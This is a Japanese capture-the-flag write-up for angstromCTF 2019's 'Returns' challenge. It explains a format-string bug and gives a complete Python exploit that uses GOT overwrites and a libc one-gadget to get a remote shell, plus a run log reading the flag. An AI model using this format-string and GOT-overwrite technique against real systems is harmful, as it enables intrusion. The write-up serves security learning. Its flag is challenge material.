# [pwn 160pts] Returns - angstromCTF 2019
64bitでSSPが有効です。
```
$ checksec returns
[*] 'returns'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP enabled (Canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```
IDAで読むと、内容はPurchasesと同じであることが分かります。
したがってFSBなのですが、flag関数がないのでシェルは自分の手で奪います。

シェルを取るためには何回かFSBを利用する必要があるので、1回目のFSBでputsのGOTアドレスをmain関数のアドレスに変更します。
また、私はこれ系の問題では同時にlibcのアドレスをリークしますが、別に2回目以降にやっても問題ありません。
で、2回目のFSBで`puts`のFSBをOne Gadget RCEに書き換えたいところなのですが、`puts`のGOTには`main`のアドレスが書かれており、One Gadget RCEのアドレスとは大きく異なるため1回で書き換えることができません。

そこで、今回は`__stack_chk_fail`のGOTを数回かけてOne Gadgetのアドレスに変更します。（要するに`main`で呼ばれない関数のGOTを書き換える。）
`__stack_chk_fail`のpltアドレスは`main`と相対的に近いので、最後に`puts`のGOTアドレスを`__stack_chk_fail@plt`に1発で書き換えることができます。

```python
from ptrlib import *

elf = ELF("./returns")
plt_stack_chk_fail = 0x401050

#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#diff = 0xe7
#libc_gadget = 0x4f322
#sock = Process("./returns")

libc = ELF("./libc.so.6")
diff = 0xf0
libc_gadget = 0x4526a
sock = Socket("shell.actf.co", 19307)

# Stage 1
sock.recvuntil("What item would you like to return? ")
payload = b'%17$p...'
payload += str2bytes("%{}c%{}$hn".format(
    (elf.symbol("main") & 0xffff) - 17,
    8 + 3
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("puts"))[:3]
sock.sendline(payload)
sock.recvuntil("We didn't sell you a ")
addr_libc_start_main = int(sock.recvuntil(".").rstrip(b"."), 16)
libc_base = addr_libc_start_main - libc.symbol("__libc_start_main") - diff
#addr_system = libc_base + libc.symbol("system")
addr_gadget = libc_base + libc_gadget
dump("libc base = " + hex(libc_base))

# Stage 2
sock.recvuntil("What item would you like to return? ")
payload = b'AAAABBBB'
payload += str2bytes("%{}c%{}$hn".format(
    (addr_gadget & 0xffff) - 8,
    11
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("__stack_chk_fail"))[:3]
sock.sendline(payload)

# Stage 3
sock.recvuntil("What item would you like to return? ")
payload = b'AAAABBBB'
payload += str2bytes("%{}c%{}$hn".format(
    ((addr_gadget >> 16) & 0xffff) - 8,
    11
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("__stack_chk_fail") + 2)[:3]
sock.sendline(payload)

# Stage 4
sock.recvuntil("What item would you like to return? ")
payload = b'AAAABBBB'
payload += str2bytes("%{}c%{}$hn".format(
    ((addr_gadget >> 32) & 0xffff) - 8,
    11
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("__stack_chk_fail") + 4)[:3]
sock.sendline(payload)

# Stage 6
_ = input()
sock.recvuntil("What item would you like to return? ")
payload = b'AAAABBBB'
payload += str2bytes("%{}c%{}$hn".format(
    (plt_stack_chk_fail & 0xffff) - 8,
    11
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("puts"))[:3]
sock.sendline(payload)

# Get the shell!
sock.interactive()
```

いぇい。
```
$ python solve.py 
[+] Socket: Successfully connected to shell.actf.co:19307

[ptrlib] libc base = 0x7f121cb0d000
[ptrlib]$ We didn't sell you a AAAABBBB
...
...
...ÐAAAA@@ with you. [ptrlib]$ ls
[ptrlib]$ flag.txt
returns
returns.c
cat flag.txt
[ptrlib]$ 
actf{no_returns_allowed}
```

# 感想
少し工夫が必要で面白かったです。
